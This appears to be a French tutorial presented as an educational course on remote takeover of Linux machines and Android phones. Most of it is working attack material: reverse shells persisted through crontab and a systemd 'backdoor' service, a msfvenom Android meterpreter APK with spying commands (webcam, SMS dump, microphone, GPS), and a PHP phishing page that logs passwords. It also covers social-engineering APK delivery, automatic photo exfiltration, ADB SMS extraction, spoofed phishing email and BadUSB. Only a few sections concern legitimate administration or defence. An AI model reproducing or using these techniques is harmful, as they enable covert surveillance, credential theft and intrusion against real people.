# Cours : Prise de Contrôle à Distance (Éducatif)

## Option 1 : Persistance sur Ordinateur (Linux)
*Objectif : Faire en sorte que la machine cible vous "appelle" automatiquement à chaque démarrage.*

### 0. Préparation (Côté Client / Votre PC)
Avant toute chose, vous devez préparer votre ordinateur à recevoir la connexion :
```bash
# Sur votre machine (L'attaquant)
nc -lvnp 4444
```

### 1. Méthode via Crontab (Simple)
Ajouter une tâche planifiée qui s'exécute au reboot :
```bash
# Sur la machine cible (VM)
(crontab -l ; echo "@reboot bash -i >& /dev/tcp/[VOTRE_IP]/4444 0>&1") | crontab -
```

### 2. Méthode via Systemd (Professionnel)
Créer un service qui relance la connexion en cas de coupure :
1. Créer `/etc/systemd/system/backdoor.service`
2. Configurer avec :
   ```ini
   [Service]
   ExecStart=/bin/bash -c "bash -i >& /dev/tcp/[VOTRE_IP]/4444 0>&1"
   Restart=always
   RestartSec=10
   ```

---

## Option 2 : Contrôle Avancé Android (Metasploit)
*Objectif : Créer un accès total (caméra, SMS, micro) via un fichier APK.*

### 1. Générer le Payload (msfvenom)
```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=[VOTRE_IP] LPORT=5566 R > test_android.apk
```

### 2. Configurer l'écoute (msfconsole)
```bash
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST [VOTRE_IP]
set LPORT 5566
exploit
```

### 3. Commandes Meterpreter (Une fois connecté)
- **webcam_snap 1** : Prend une photo (caméra arrière).
- **webcam_stream** : Flux vidéo en direct.
- **dump_sms** : Récupère tous les SMS.
- **geolocate** : Position GPS précise.
- **record_mic 10** : Enregistre 10s de son.
- **shell** : Accès au terminal Android.

---

## Option 3 : Messagerie Simple entre Serveurs (Netcat)
*Objectif : Envoyer du texte ou des alertes entre deux machines sur le même réseau.*

### 1. Préparer le Serveur (Le Récepteur)
Le serveur doit "écouter" sur un port spécifique (ex: 1234) :
```bash
# Écoute simple (s'arrête après un message)
nc -l 1234

# Écoute permanente (boucle infinie)
while true; do nc -l 1234; done
```

### 2. Envoyer un Message (L'Expéditeur)
Depuis une autre machine (ou un autre terminal) :
```bash
# Envoi direct d'un texte
echo "Alerte : Serveur A redémarré" | nc [IP_SERVEUR_B] 1234

# Envoi via un script interactif
nc [IP_SERVEUR_B] 1234
# (Tapez votre texte, puis Ctrl+D pour envoyer et quitter)
```

---

## Option 4 : Capture de Données (Phishing Éducatif)
*Objectif : Créer une page de connexion factice pour récupérer un email et un mot de passe.*

### 1. Installation du Serveur Web
Sur le serveur cible (ex: Serveur 2) :
```bash
sudo apt update
sudo apt install apache2 php libapache2-mod-php -y
sudo rm /var/www/html/index.html # Supprimer la page par défaut
sudo chmod 777 /var/www/html/    # Donner les droits d'écriture
```

### 2. Création de la page de capture avec erreur (`sudo nano /var/www/html/index.php`)
```php
<?php
session_start();
$error = "";

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $email = $_POST['email'];
    $password = $_POST['password'];
    $log = "[" . date('Y-m-d H:i:s') . "] Email: $email | Pass: $password\n";
    file_put_contents("log.txt", $log, FILE_APPEND);

    // Si c'est la première tentative, on affiche une erreur
    if (!isset($_SESSION['tried'])) {
        $_SESSION['tried'] = true;
        $error = "Identifiant ou mot de passe incorrect. Veuillez réessayer.";
    } else {
        // Si c'est la deuxième, on redirige vers le vrai service
        session_destroy();
        header("Location: https://accounts.google.com");
        exit();
    }
}
?>

<!DOCTYPE html>
<html>
<body style="text-align: center; font-family: Arial; padding-top: 50px;">
    <h2>Connexion Requise</h2>
    <?php if($error) echo "<p style='color:red; font-weight:bold;'>$error</p>"; ?>
    <form method="POST">
        <input type="email" name="email" placeholder="Email" required><br><br>
        <input type="password" name="password" placeholder="Mot de passe" required><br><br>
        <button type="submit">Se connecter</button>
    </form>
</body>
</html>
```

### 3. Consultation des résultats
Les données saisies par les victimes s'afficheront dans ce fichier :
```bash
cat /var/www/html/log.txt
```

---

## Option 5 : Contrôle via ADB (Réseau Local)
*Objectif : Accéder au téléphone Android s'il est sur le même Wi-Fi et que le débogage est activé.*

### 1. Connexion au téléphone
ouvert le port 
```bash
adb tcpip 5555
```
Si le port 5555 est ouvert (nécessite une activation préalable via USB ou dans les options développeur) :
```bash
adb connect [IP_DU_TELEPHONE]:5555
```

### 2. Récupérer les SMS
Une fois connecté, vous pouvez extraire tous les messages :
```bash
# Lire tous les SMS (Inclus : numéro, date, texte)
adb shell content query --uri content://sms/
```

### 3. Autres commandes utiles
- **adb shell screencap -p /sdcard/screen.png** : Prendre une capture d'écran.
- **adb pull /sdcard/screen.png .** : Télécharger la capture sur votre PC.
- **adb shell input tap x y** : Simuler un clic sur l'écran.
- **adb shell am start -a android.intent.action.VIEW -d "http://google.com"** : Ouvrir un site web.

---

## Option 6 : Administration et Extinction à Distance (SSH)
*Objectif : Prendre le contrôle total du terminal et éteindre ou redémarrer la machine cible.*

### 1. Se connecter en SSH
```bash
ssh utilisateur@IP_CIBLE
```

### 2. Éteindre la machine immédiatement
```bash
# Une fois connecté
sudo shutdown now

# Ou en une seule ligne depuis votre PC
ssh utilisateur@IP_CIBLE 'sudo shutdown now'
```

### 3. Redémarrer la machine
```bash
sudo reboot
```

### 4. Programmer une extinction (ex: dans 15 minutes)
```bash
sudo shutdown +15 "Maintenance système, extinction automatique."
```

---

## Outils Indispensables d'Administration (Bonus)
*Objectif : Optimiser le transfert de fichiers et le contrôle à distance.*

### 1. `rsync` (Le remplaçant de `scp`)
Beaucoup plus rapide que `scp` car il ne copie que les différences entre les fichiers :
```bash
rsync -avz /chemin/local/ utilisateur@IP_CIBLE:/chemin/distant/
```

### 2. `ssh-copy-id` (Connexion sans mot de passe)
Copie votre clé SSH publique sur le serveur pour une connexion automatique sécurisée :
```bash
ssh-copy-id utilisateur@IP_CIBLE
```

### 3. `tmux` ou `screen` (Session persistante)
Permet de lancer un script et de laisser tourner en arrière-plan même après avoir quitté SSH :
```bash
tmux           # Lancer une session
(Ctrl+B puis D) # Se détacher (laisser le script tourner)
tmux attach    # Se reconnecter à la session plus tard
```

### 4. `ssh -L` (Tunneling / Accès aux ports bloqués)
Accéder à un service (ex: interface web sur le port 80) qui est bloqué par le pare-feu :
```bash
ssh -L 8080:localhost:80 utilisateur@IP_CIBLE
# Ensuite, ouvrez http://localhost:8080 dans votre navigateur
```

---

## Option 7 : Contrôle Graphique à Distance (VNC)
*Objectif : Voir l'écran et contrôler la souris d'une machine distante.*

### Cas A : Partage de l'écran réel (Si un utilisateur est déjà connecté)
1. **Sur le Serveur 2 (Cible)** :
   ```bash
   sudo apt install x11vnc -y
   x11vnc -display :0 -forever -shared -rfbport 5900
   ```
2. **Sur le Serveur 1 (Contrôleur)** :
   ```bash
   vncviewer [IP_SERVEUR_2]:5900
   ```

### Cas B : Création d'un Bureau Virtuel (Si le serveur est en mode TTY/Texte)
1. **Sur le Serveur 2 (Cible)** :
   ```bash
   # Installer l'interface graphique
   sudo apt install xfce4 xfce4-goodies tightvncserver -y
   # Lancer le bureau virtuel (Créer un mot de passe)
   vncserver :1
   ```
2. **Sur le Serveur 1 (Contrôleur)** :
   ```bash
   # Se connecter à l'écran :1 (Port 5901)
   vncviewer [IP_SERVEUR_2]:5901
   ```

### 3. Sécuriser avec un Tunnel SSH (Recommandé)
Le protocole VNC n'est pas crypté. Pour le sécuriser, faites passer le flux par SSH :
```bash
# Sur votre PC
ssh -L 5900:localhost:5900 utilisateur@IP_CIBLE
# Connectez ensuite votre vncviewer à :
vncviewer localhost:5900
```

---

## Option 8 : Distribution à distance (Serveur Web)
*Objectif : Faire télécharger l'APK sans accès physique (Phishing / Social Engineering).*

### 1. Héberger l'APK avec Python
Dans le dossier contenant l'APK sur votre PC :
```bash
python3 -m http.server 8080
```

### 2. Le lien cible
L'adresse à envoyer à la cible (par SMS, mail, etc.) :
`http://[VOTRE_IP]:8080/test_5566.apk`

---

## Option 9 : Exfiltration Automatique (Discrète)
*Objectif : Télécharger les photos dès que la cible clique et lance l'appli.*

### 1. Créer un script de ressources (`auto_exfil.rc`)
```bash
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST [VOTRE_IP]
set LPORT 5566
set ExitOnSession false
# Téléchargement automatique dès l'ouverture de session
set AutoRunScript "download /sdcard/DCIM/Camera/ ./vols_donnees/"
exploit -j -z
```

### 2. Lancer l'écouteur automatisé
```bash
msfconsole -r auto_exfil.rc
```

---

## Option 11 : Envoi d'E-mail HTML (Phishing Avancé)
*Objectif : Envoyer une alerte de sécurité crédible directement depuis le terminal.*

### 1. Préparation du script Python (`send_phishing.py`)
Utiliser la bibliothèque `smtplib` pour envoyer un e-mail avec un corps HTML complet (boutons, logos, styles).

### 2. Le secret du masquage
- **L'expéditeur** : Modifier le champ `msg['From']` pour afficher un nom de confiance (ex: "Google Security").
- **Le lien** : Cacher l'IP derrière un bouton HTML `<a href="...">`.

### 3. Exécution
```bash
python3 send_phishing.py
```

---

## Option 12 : Clé USB d'Espionnage (BadUSB / Scripts)
*Objectif : Exécuter des commandes ou voler des données dès le branchement d'une clé.*

### 1. Le concept du BadUSB
Utiliser un microcontrôleur (ex: Digispark) pour simuler un clavier. Il "tape" un Reverse Shell en 3 secondes dès qu'il est branché.

### 2. Script de vol automatique (Linux)
Créer un script sur la clé qui parcourt les dossiers et envoie les fichiers sensibles (clés SSH, photos, documents) vers votre IP via `netcat`.

### 3. Protection
- Désactiver l'exécution automatique (Autorun).
- Utiliser des logiciels de blocage de ports USB (USBGuard).

---

## Option 13 : Recherche Massive et Exfiltration (Server-Side)
*Objectif : Trouver et copier toutes les photos d'un serveur ou d'une VM via le terminal.*

### 1. Chercher toutes les photos (Simple)
```bash
find / -type f \( -name "*.jpg" -o -name "*.png" -o -name "*.jpeg" -o -name "*.gif" \) 2>/dev/null
```

### 2. Lister les 20 dernières photos modifiées
```bash
find /home -type f \( -name "*.jpg" -o -name "*.png" \) -printf '%T@ %p\n' 2>/dev/null | sort -nr | head -n 20
```

### 3. Exfiltrer automatiquement vers un dossier caché
```bash
# Créer un dossier caché
mkdir -p /tmp/.sys_logs_temp
# Chercher et copier toutes les photos (.jpg et .png)
find /home -type f \( -name "*.jpg" -o -name "*.png" \) -exec cp {} /tmp/.sys_logs_temp/ \; 2>/dev/null
```

---

## Option 14 : Sécurisation de l'Accès SSH (Défense)
*Objectif : Empêcher un intrus d'entrer, même s'il possède votre mot de passe.*

### 1. Utiliser des Clés SSH (Recommandé)
Désactiver l'authentification par mot de passe pour forcer l'usage d'un certificat physique.
```bash
# Dans /etc/ssh/sshd_config
PasswordAuthentication no
```

### 2. Double Authentification (2FA)
Ajouter un code Google Authenticator pour chaque connexion SSH.
```bash
sudo apt install libpam-google-authenticator -y
google-authenticator
```

### 3. Filtrage IP (Fail2Ban)
Bannir automatiquement les adresses IP qui tentent de deviner votre mot de passe.
```bash
sudo apt install fail2ban -y
```

---
**Note de sécurité** : Ces outils sont destinés à l'apprentissage et aux tests de pénétration autorisés uniquement.
